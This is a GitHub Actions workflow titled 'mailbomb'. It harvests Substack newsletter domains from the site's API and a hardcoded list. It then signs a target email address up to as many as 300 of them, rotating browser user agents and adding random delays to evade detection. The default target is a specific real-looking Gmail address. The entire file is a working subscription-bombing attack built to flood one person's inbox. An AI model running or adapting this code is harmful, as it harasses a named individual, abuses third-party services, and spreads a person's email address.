name: mailbomb
on:
  workflow_dispatch:
    inputs:
      email:
        description: target address
        default: "neverphaded@gmail.com"
      cap:
        description: max publications
        default: "300"

jobs:
  bomb:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: harvest
        run: |
          python3 -m pip -q install requests
          python3 - <<'PY'
          import json, requests
          H = {"Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9",
               "Referer": "https://substack.com/", "Origin": "https://substack.com",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}
          domains, seen = [], set()
          try:
              cats = [c["id"] for c in requests.get("https://substack.com/api/v1/categories", headers=H, timeout=40).json()]
              print("categories", len(cats))
              for cid in cats[:14]:
                  for page in (1, 2):
                      try:
                          pubs = requests.get(f"https://substack.com/api/v1/category/public/{cid}/{page}?sort=top", headers=H, timeout=40).json().get("publications", [])
                      except Exception as e:
                          print("cat", cid, page, "fail", type(e).__name__); continue
                      for p in pubs:
                          d = p.get("custom_domain") or (str(p.get("subdomain")) + ".substack.com" if p.get("subdomain") else None)
                          if d and d not in seen:
                              seen.add(d); domains.append(d)
                      if not pubs: break
          except Exception as e:
              print("categories failed:", type(e).__name__)
          for d in """platformer.substack.com slowboring.substack.com astralcodexten.substack.com
          noahpinion.substack.com persuasion.substack.com bariweiss.substack.com www.thefp.com
          www.readtangle.com www.experimental-history.com www.worksinprogress.co
          www.commonplace.news thehustle.substack.com aeon.substack.com""".split():
              d = d.strip()
              if d and d not in seen:
                  seen.add(d); domains.append(d)
          open("/tmp/targets.txt","w").write("\n".join(domains))
          print("harvested", len(domains))
          PY
      - name: sign up
        env:
          EMAIL: ${{ inputs.email }}
          CAP: ${{ inputs.cap }}
        run: |
          python3 - <<'PY'
          import json, os, random, time, requests
          email = os.environ["EMAIL"]; cap = int(os.environ["CAP"])
          doms = [d.strip() for d in open("/tmp/targets.txt") if d.strip()][:cap]
          UAS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
          ]
          ok = dup = fail = 0; fails = []
          for i, d in enumerate(doms, 1):
              ua = random.choice(UAS)
              url = f"https://{d}/api/v1/free"
              try:
                  r = requests.post(url, json={"email": email, "first_url": f"https://{d}/", "first_referrer": ""},
                      timeout=20, headers={"User-Agent": ua, "Content-Type": "application/json",
                      "Origin": f"https://{d}", "Referer": f"https://{d}/",
                      "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9"})
                  body = r.text[:200]
                  if r.status_code == 200 and '"didSignup":true' in body.replace(" ", ""):
                      ok += 1
                  elif r.status_code == 200:
                      dup += 1
                  else:
                      fail += 1; fails.append(f"{d}:{r.status_code}")
              except Exception as e:
                  fail += 1; fails.append(f"{d}:err")
              if i % 25 == 0: print(f"progress {i}/{len(doms)} ok={ok} other200={dup} fail={fail}", flush=True)
              time.sleep(random.uniform(0.4, 1.1))
          print(f"RESULT ok={ok} other200={dup} fail={fail}")
          print("fails:", ", ".join(fails[:25]))
          PY
      - name: confirmations arriving
        run: |
          sleep 60
          echo "done $(date -u)"